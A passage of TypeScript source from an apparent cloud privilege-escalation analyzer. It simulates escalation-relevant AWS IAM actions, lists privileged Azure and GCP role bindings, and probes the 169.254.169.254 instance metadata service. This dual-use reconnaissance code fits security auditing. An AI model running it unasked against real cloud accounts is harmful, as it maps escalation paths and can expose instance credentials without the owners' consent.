      "iam", "simulate-principal-policy", "--profile", profile, "--output", "json",
      "--policy-source-arn", arn,
      "--action-names",
      "iam:CreatePolicy", "iam:AttachUserPolicy", "iam:AttachRolePolicy",
      "iam:PutRolePolicy", "iam:CreateAccessKey", "sts:AssumeRole",
      "iam:CreateLoginProfile", "iam:UpdateLoginProfile",
    ])) as Record<string, unknown>;
    const paths: PrivEscPath[] = [];
    for (const evaluation of Array.isArray(data["EvaluationResults"]) ? (data["EvaluationResults"] as unknown[]) : []) {
      const ev = evaluation as Record<string, unknown>;
      if (ev["EvalDecision"] === "allowed") {
        const action = String(ev["EvalActionName"] ?? "");
        const mapped = AWS_ACTION_MAP[action];
        if (mapped) paths.push(mapped);
      }
    }
    return paths;
  }

  private async getAwsArn(profile: string): Promise<string> {
    const data = (await runCli("aws", ["sts", "get-caller-identity", "--profile", profile, "--output", "json"])) as Record<string, unknown>;
    return String(data["Arn"] ?? "");
  }

  async analyzeAzure(subscription = ""): Promise<PrivEscPath[]> {
    const args = ["az", "role", "assignment", "list", "--include-inherited", "--output", "json"];
    if (subscription) args.push("--subscription", subscription);
    const data = await runCli("az", args.slice(1));
    const paths: PrivEscPath[] = [];
    const privileged = new Set(["Owner", "Contributor", "User Access Administrator"]);
    for (const assignment of Array.isArray(data) ? data : []) {
      const role = String((assignment as Record<string, unknown>)["roleDefinitionName"] ?? "");
      if (privileged.has(role)) {
        paths.push(makePrivEscPath("PrivilegedRoleAssignment", `Has privileged role: ${role}`, "azure", { targetRole: role, mitreId: "T1078.004" }));
      }
    }
    return paths;
  }

  async analyzeGcp(project = ""): Promise<PrivEscPath[]> {
    if (!project) return [];
    const data = (await runCli("gcloud", ["projects", "get-iam-policy", project, "--format", "json"])) as Record<string, unknown>;
    const paths: PrivEscPath[] = [];
    for (const binding of Array.isArray(data["bindings"]) ? (data["bindings"] as unknown[]) : []) {
      const role = String((binding as Record<string, unknown>)["role"] ?? "");
      if (role.toLowerCase().includes("admin") || role.toLowerCase().includes("owner")) {
        const members = Array.isArray((binding as Record<string, unknown>)["members"]) ? ((binding as Record<string, unknown>)["members"] as unknown[]) : [];
        for (const _member of members) {
          paths.push(makePrivEscPath("PrivilegedIAMBinding", `Has privileged role: ${role}`, "gcp", { targetRole: role, mitreId: "T1078.004" }));
        }
      }
    }
    return paths;
  }

  async getMetadataService(target = "169.254.169.254"): Promise<Record<string, unknown>> {
    const endpoints: Record<string, string> = {
      aws: `http://${target}/latest/meta-data/`,
      azure: `http://${target}/metadata/instance?api-version=2021-02-01`,
      gcp: `http://${target}/computeMetadata/v1/`,
    };
    const results: Record<string, unknown> = {};
    for (const [cloud, url] of Object.entries(endpoints)) {
      const headers: Record<string, string> =
        cloud === "azure" ? { Metadata: "true" } : cloud === "gcp" ? { "Metadata-Flavor": "Google" } : {};
      const probe = await httpGet(url, headers);
      results[cloud] = probe.ok && probe.text.trim()
        ? { accessible: true, data: probe.text.slice(0, 2000) }
        : { accessible: false };
    }
    return results;
  }
}
